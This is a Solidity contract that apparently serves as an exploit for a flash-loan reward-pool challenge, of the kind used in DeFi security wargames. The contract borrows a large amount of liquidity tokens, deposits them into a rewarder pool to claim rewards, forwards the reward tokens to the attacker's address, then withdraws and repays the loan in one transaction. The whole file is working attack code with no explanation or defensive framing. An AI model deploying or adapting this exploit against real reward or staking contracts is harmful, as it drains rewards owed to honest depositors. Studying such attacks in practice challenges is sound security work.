// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashLoan {
    function flashLoan(uint256 amount) external;
}

interface IRewarderPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function distributeRewards() external returns (uint256 rewards);
}

contract AttackRewarder {
    IFlashLoan flashloan;
    IRewarderPool rewarderPool;
    IERC20 liquidityToken;
    IERC20 rewardToken;
    address attacker;

    constructor(address _flashloan, address _rewarderPool, address _liquidityToken, address _rewardToken) {
        flashloan = IFlashLoan(_flashloan);
        rewarderPool = IRewarderPool(_rewarderPool);
        liquidityToken = IERC20(_liquidityToken);
        rewardToken = IERC20(_rewardToken);
        attacker = msg.sender;
    }

    function attack(uint256 amount) external {
        liquidityToken.approve(address(rewarderPool), amount);
        flashloan.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        rewarderPool.deposit(amount);
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
        rewarderPool.withdraw(amount);
        // pay back liquidity token
        liquidityToken.transfer(address(flashloan), amount);
    }
}